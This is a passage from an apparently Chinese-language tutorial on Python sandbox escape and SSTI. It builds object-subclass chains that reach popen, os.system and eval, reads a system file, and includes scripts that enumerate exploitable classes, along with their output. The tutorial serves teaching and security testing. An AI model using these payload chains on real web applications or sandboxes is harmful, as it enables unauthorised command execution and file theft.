<pre class="line-numbers language-python" data-language="python"><code class="language-python">__getattribute__
当类被调用的时候，无条件进入此函数。
__getattr__
对象中不存在的属性时调用
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Bob"</span>
	<span class="token keyword">def</span> <span class="token function">__getattribute__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>  
a<span class="token punctuation">.</span>name   <span class="token comment">#ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。</span>
	<span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getattr'</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>age   <span class="token comment">#getattr  调用不存在的属性会执行，相当于处理了AttributeError。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="4-类继承使用">4. 类继承使用</h4>
<p>尝试利用继承关系来找到object类</p>
<pre class="line-numbers language-none"><code class="language-none">"".__class__.__bases__   #(&lt;class 'object'&gt;,)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p>
<pre class="line-numbers language-none"><code class="language-none">[].__class__.__bases__
{}.__class__.__bases__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。</p>
<pre class="line-numbers language-none"><code class="language-none">"".__class__.__bases__[0].__subclasses__()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622204430106.png" alt="image-20230622204430106"></p>
<p>找到需要使用的类，其中有可以使用的类，在python3中使用</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;class 'os._wrap_close'&gt;,&lt;class 'warnings.WarningMessage'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>调用他们</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[128]
&lt;class 'os._wrap_close'&gt;

&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[177]
&lt;class 'warnings.WarningMessage'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果子类过多，不好查找是第几个下标，可以使用如下来标记</p>
<pre class="line-numbers language-none"><code class="language-none">for i in enumerate("".__class__.__bases__[0].__subclasses__()):
	print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622204534944.png" alt="image-20230622204534944"></p>
<p>先来读取一下文件，C盘下的win.ini文件</p>
<pre class="line-numbers language-none"><code class="language-none">"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622204612746.png" alt="image-20230622204612746"></p>
<p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p>
<pre class="line-numbers language-none"><code class="language-none">"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("C:\\windows\\win.ini").read()

#如果这里会报错添加__builtins__
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__['popen']("C:\\windows\\win.ini").read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果想直接在终端显示出来</p>
<pre class="line-numbers language-none"><code class="language-none">"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("type C:\\windows\\win.ini").read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622204914438.png" alt="image-20230622204914438"></p>
<p>在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。</p>
<pre class="line-numbers language-none"><code class="language-none">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].getline("C:\\windows\\win.ini",1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('whoami'
)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>但是python2如果使用字符串的形式，会报如下错误，因为<code>__bases__</code>获取的并不是object类</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[59]
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
IndexError: list index out of range<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>只需要再去获得一次即可</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; "".__class__.__bases__[0].__bases__[0].__subclasses__()[59]
&lt;class 'warnings.WarningMessage'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="5-特殊函数查找">5. 特殊函数查找</h4>
<h5 id="5-1-python3">5.1 python3</h5>
<p>在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)</p>
<pre class="line-numbers language-none"><code class="language-none">asyncio
collections
concurrent
ctypes
curses
dbm
distutils
email
encodings
......
warnings.py
wave.py
weakref.py
webbrowser.py
xdrlib.py
zipapp.py
zipfile.py
zipimport.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=UTF-8</span>
<span class="token keyword">import</span> codecs
<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict
<span class="token keyword">with</span> codecs<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'python.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    modules <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
modules <span class="token operator">=</span> <span class="token punctuation">[</span>m<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.py'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> modules<span class="token punctuation">]</span>
target_modules <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'timeit'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'commands'</span><span class="token punctuation">]</span>
target_functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">]</span>
all_targets <span class="token operator">=</span> target_modules <span class="token operator">+</span> target_functions
results <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> m <span class="token keyword">in</span> modules<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        module <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token comment"># print('ERROR:', m)</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> all_targets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> t <span class="token keyword">in</span> module<span class="token punctuation">.</span>__dict__<span class="token punctuation">:</span>
            results<span class="token punctuation">[</span>m<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"可利用模块数量为:"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> results<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">find_modules <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>
target_modules <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'timeit'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">]</span>
target_functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">]</span>
all_targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>find_modules<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> target_modules <span class="token operator">+</span> target_functions<span class="token punctuation">)</span><span class="token punctuation">)</span>
all_modules <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>find_modules<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> target_modules<span class="token punctuation">)</span><span class="token punctuation">)</span>
subclasses <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
sub_name <span class="token operator">=</span> <span class="token punctuation">[</span>s<span class="token punctuation">.</span>__name__ <span class="token keyword">for</span> s <span class="token keyword">in</span> subclasses<span class="token punctuation">]</span>
<span class="token comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------1-----------'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> s <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>sub_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> f <span class="token keyword">in</span> all_targets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> f <span class="token operator">==</span> s<span class="token punctuation">:</span>
            <span class="token keyword">if</span> f <span class="token keyword">in</span> target_functions<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> f<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> f <span class="token keyword">in</span> all_modules<span class="token punctuation">:</span>
                target <span class="token operator">=</span> find_modules<span class="token punctuation">[</span>f<span class="token punctuation">]</span>
                sub_dict <span class="token operator">=</span> subclasses<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__
                <span class="token keyword">for</span> t <span class="token keyword">in</span> target<span class="token punctuation">:</span>
                    <span class="token keyword">if</span> t <span class="token keyword">in</span> sub_dict<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> f<span class="token punctuation">,</span> target<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------2-----------'</span><span class="token punctuation">)</span>
<span class="token comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> sub <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>subclasses<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        more <span class="token operator">=</span> sub<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__
        <span class="token keyword">for</span> m <span class="token keyword">in</span> all_targets<span class="token punctuation">:</span>
            <span class="token keyword">if</span> m <span class="token keyword">in</span> more<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> sub<span class="token punctuation">,</span> m<span class="token punctuation">,</span> find_modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------3-----------'</span><span class="token punctuation">)</span>
<span class="token comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> sub <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>subclasses<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        more <span class="token operator">=</span> sub<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> j<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>more<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> f <span class="token keyword">in</span> all_targets<span class="token punctuation">:</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> f <span class="token keyword">in</span> v<span class="token punctuation">:</span>
                        <span class="token keyword">if</span> f <span class="token keyword">in</span> target_functions<span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> sub<span class="token punctuation">,</span> f<span class="token punctuation">)</span>
                        <span class="token keyword">elif</span> f <span class="token keyword">in</span> all_modules<span class="token punctuation">:</span>
                            target <span class="token operator">=</span> find_modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
                            sub_dict <span class="token operator">=</span> v<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__
                            <span class="token keyword">for</span> t <span class="token keyword">in</span> target<span class="token punctuation">:</span>
                                <span class="token keyword">if</span> t <span class="token keyword">in</span> sub_dict<span class="token punctuation">:</span>
                                    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> sub<span class="token punctuation">,</span> f<span class="token punctuation">,</span> target<span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                    <span class="token keyword">pass</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------4-----------'</span><span class="token punctuation">)</span>
<span class="token comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span>
<span class="token comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> sub <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>subclasses<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        more <span class="token operator">=</span> sub<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__
        <span class="token keyword">for</span> f <span class="token keyword">in</span> all_targets<span class="token punctuation">:</span>
            <span class="token keyword">if</span> f <span class="token keyword">in</span> more<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> f<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">----------2-----------
75 &lt;class '_frozen_importlib._ModuleLock'&gt; __builtins__ None
75 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ None
75 &lt;class '_frozen_importlib._ModuleLock'&gt; sys None
76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __builtins__ None
76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ None
76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; sys None
77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __builtins__ None
77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ None
77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; sys None
78 &lt;class '_frozen_importlib._installed_safely'&gt; __builtins__ None
78 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ None
78 &lt;class '_frozen_importlib._installed_safely'&gt; sys None
79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __builtins__ None
79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ None
79 &lt;class '_frozen_importlib.ModuleSpec'&gt; sys None
91 &lt;class '_frozen_importlib_external.FileLoader'&gt; __builtins__ None
91 &lt;class '_frozen_importlib_external.FileLoader'&gt; sys None
92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __builtins__ None
92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; sys None
93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __builtins__ None
93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; sys None
95 &lt;class '_frozen_importlib_external.FileFinder'&gt; __builtins__ None
95 &lt;class '_frozen_importlib_external.FileFinder'&gt; sys None
103 &lt;class 'codecs.IncrementalEncoder'&gt; __builtins__ None
103 &lt;class 'codecs.IncrementalEncoder'&gt; sys None
103 &lt;class 'codecs.IncrementalEncoder'&gt; open None
104 &lt;class 'codecs.IncrementalDecoder'&gt; __builtins__ None
104 &lt;class 'codecs.IncrementalDecoder'&gt; sys None
104 &lt;class 'codecs.IncrementalDecoder'&gt; open None
105 &lt;class 'codecs.StreamReaderWriter'&gt; __builtins__ None
105 &lt;class 'codecs.StreamReaderWriter'&gt; sys None
105 &lt;class 'codecs.StreamReaderWriter'&gt; open None
106 &lt;class 'codecs.StreamRecoder'&gt; __builtins__ None
106 &lt;class 'codecs.StreamRecoder'&gt; sys None
106 &lt;class 'codecs.StreamRecoder'&gt; open None
128 &lt;class 'os._wrap_close'&gt; __builtins__ None
128 &lt;class 'os._wrap_close'&gt; sys None
128 &lt;class 'os._wrap_close'&gt; open None
129 &lt;class '_sitebuiltins.Quitter'&gt; __builtins__ None
129 &lt;class '_sitebuiltins.Quitter'&gt; sys None
130 &lt;class '_sitebuiltins._Printer'&gt; __builtins__ None
130 &lt;class '_sitebuiltins._Printer'&gt; sys None
137 &lt;class 'types.DynamicClassAttribute'&gt; __builtins__ None
138 &lt;class 'types._GeneratorWrapper'&gt; __builtins__ None
139 &lt;class 'warnings.WarningMessage'&gt; __builtins__ None
139 &lt;class 'warnings.WarningMessage'&gt; sys None
140 &lt;class 'warnings.catch_warnings'&gt; __builtins__ None
140 &lt;class 'warnings.catch_warnings'&gt; sys None
167 &lt;class 'reprlib.Repr'&gt; __builtins__ None
174 &lt;class 'functools.partialmethod'&gt; __builtins__ None
176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __builtins__ None
176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; sys None
177 &lt;class 'contextlib._BaseExitStack'&gt; __builtins__ None
177 &lt;class 'contextlib._BaseExitStack'&gt; sys None
----------3-----------
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; eval
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; compile
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; eval
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; compile
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; eval
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; compile
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; eval
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; compile
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; __import__
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; eval
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; compile
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; eval
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; compile
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; __import__
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; eval
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; compile
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __import__
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; eval
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; compile
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __import__
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; eval
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; compile
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; __import__
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; eval
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; compile
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; __import__
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open
103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; eval
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; compile
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; __import__
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open
104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; eval
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; compile
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; __import__
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open
105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open
106 7 &lt;class 'codecs.StreamRecoder'&gt; exec
106 7 &lt;class 'codecs.StreamRecoder'&gt; eval
106 7 &lt;class 'codecs.StreamRecoder'&gt; compile
106 7 &lt;class 'codecs.StreamRecoder'&gt; __import__
106 7 &lt;class 'codecs.StreamRecoder'&gt; open
106 56 &lt;class 'codecs.StreamRecoder'&gt; open
128 1 &lt;class 'os._wrap_close'&gt; exec
128 1 &lt;class 'os._wrap_close'&gt; file
128 1 &lt;class 'os._wrap_close'&gt; open
128 7 &lt;class 'os._wrap_close'&gt; exec
128 7 &lt;class 'os._wrap_close'&gt; eval
128 7 &lt;class 'os._wrap_close'&gt; compile
128 7 &lt;class 'os._wrap_close'&gt; __import__
128 7 &lt;class 'os._wrap_close'&gt; open
128 11 &lt;class 'os._wrap_close'&gt; open
129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec
129 7 &lt;class '_sitebuiltins.Quitter'&gt; eval
129 7 &lt;class '_sitebuiltins.Quitter'&gt; compile
129 7 &lt;class '_sitebuiltins.Quitter'&gt; __import__
129 7 &lt;class '_sitebuiltins.Quitter'&gt; open
130 7 &lt;class '_sitebuiltins._Printer'&gt; exec
130 7 &lt;class '_sitebuiltins._Printer'&gt; eval
130 7 &lt;class '_sitebuiltins._Printer'&gt; compile
130 7 &lt;class '_sitebuiltins._Printer'&gt; __import__
130 7 &lt;class '_sitebuiltins._Printer'&gt; open
137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec
137 7 &lt;class 'types.DynamicClassAttribute'&gt; eval
137 7 &lt;class 'types.DynamicClassAttribute'&gt; compile
137 7 &lt;class 'types.DynamicClassAttribute'&gt; __import__
137 7 &lt;class 'types.DynamicClassAttribute'&gt; open
138 7 &lt;class 'types._GeneratorWrapper'&gt; exec
138 7 &lt;class 'types._GeneratorWrapper'&gt; eval
138 7 &lt;class 'types._GeneratorWrapper'&gt; compile
